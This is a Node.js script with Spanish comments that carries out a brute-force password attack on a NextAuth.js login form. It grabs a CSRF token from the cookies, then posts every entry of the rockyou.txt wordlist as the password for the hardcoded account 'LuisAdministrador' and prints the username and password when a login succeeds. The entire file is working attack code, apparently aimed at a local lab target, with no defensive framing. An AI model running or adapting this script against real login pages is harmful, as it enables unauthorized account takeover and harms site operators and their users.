import 'dotenv/config';
import axios from 'axios';
import fs from 'fs';

const BASE_URL = process.env.BASE_URL;
const LOGIN_PATH = process.env.LOGIN_PATH;

const session = axios.create({
    baseURL: BASE_URL,
    withCredentials: true
});

async function obtenerTokenCSRF() {
    // Hacer GET a la página de login
    const response = await session.get('/login');
    
    // Buscar en todas las cookies
    const cookies = response.headers['set-cookie'] || [];
    console.log('Cookies recibidas:', cookies);
    
    // NextAuth usa next-auth.csrf-token
    const csrfCookie = cookies.find(c => c.includes('csrf-token') || c.includes('csrfToken'));
    
    if (csrfCookie) {
        const token = csrfCookie.split(';')[0].split('=')[1];
        console.log(`[+] Token CSRF: ${token}`);
        return token;
    }
    
    // Si no hay cookie, probar con un token vacío o genérico
    console.log('[-] No se encontró cookie CSRF');
    console.log('    NextAuth puede usar token en el body');
    return null;
}

async function ataqueFuerzaBruta(usuario, csrfToken) {
    const data = fs.readFileSync("rockyou.txt", 'latin1');
    const passwords = data.split('\n').map(p => p.trim()).filter(p => p);
    
    console.log(`Probando ${passwords.length} contraseñas...\n`);
    
    for (let i = 0; i < passwords.length; i++) {
        const password = passwords[i];
        
        try {
            const params = new URLSearchParams();
            params.append('username', usuario);
            params.append('password', password);
            params.append('csrfToken', csrfToken || '');
            params.append('callbackUrl', 'http://localhost:3000/login');
            
            const response = await session.post(LOGIN_PATH, params, {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            });
            
            if (response.status === 200 && response.data?.url) {
                console.log(`[+] ÉXITO: ${usuario}:${password}`);
                return password;
            }
            
            if ((i + 1) % 100 === 0) {
                console.log(`  Progreso: ${i + 1}/${passwords.length}`);
            }
            
        } catch (e) {
            // Continuar
        }
        
        await new Promise(r => setTimeout(r, 100));
    }
    
    console.log("[-] No se encontró la contraseña");
    return null;
}

// === EJECUCIÓN ===
async function main() {
    console.log("=== Ataque Fuerza Bruta NextAuth.js ===\n");
    
    const token = await obtenerTokenCSRF();
    await ataqueFuerzaBruta("LuisAdministrador", token);
}

main().catch(console.error);